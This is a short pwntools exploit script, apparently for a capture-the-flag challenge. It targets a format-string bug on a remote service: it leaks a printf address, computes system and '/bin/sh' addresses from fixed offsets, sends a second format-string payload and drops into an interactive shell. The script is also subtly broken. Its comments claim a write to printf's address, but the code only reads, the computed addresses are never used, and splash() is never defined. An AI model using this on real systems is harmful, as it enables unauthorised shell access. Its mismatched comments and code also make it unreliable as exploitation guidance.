from pwn import *
import sys

argv = sys.argv

DEBUG = False

context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def connect():
    NC = sys.argv[1]
    ip = NC.split(":")[0]
    port = int(NC.split(":")[1])
    sh = remote(ip, port)
    REMOTE = True
    return sh

# Cool!
splash()

# Connect to local/remote process
sh = connect()


	
# Second pass
print("2nd pass...")

# Payload that uses fsb to leak printf addr from stack
payload = "%2$x"

# Send payload
sh.sendlineafter("again?\n", payload)

# Get data
leak = int(sh.recvline()[-10:-2],16)
print("PRINTF ADDR: " + str(hex(leak)))

# Calculate system and binsh addresses.
sys_offset = -0xe070
binsh_offset = 0xcc8ef
sys_addr = leak + sys_offset
binsh_addr = leak + binsh_offset

# Third pass
print("3rd pass...")

# Payload that uses fsb to write system addr to printf addr
payload = p32(0x8048180)+b"%11$s"

# Send payload
sh.sendlineafter("again?\n", payload)

# Get data
leak = int(sh.recvline()[-10:-2],16)
print("PRINTF ADDR: " + str(hex(leak)))

# Open shell
sh.interactive()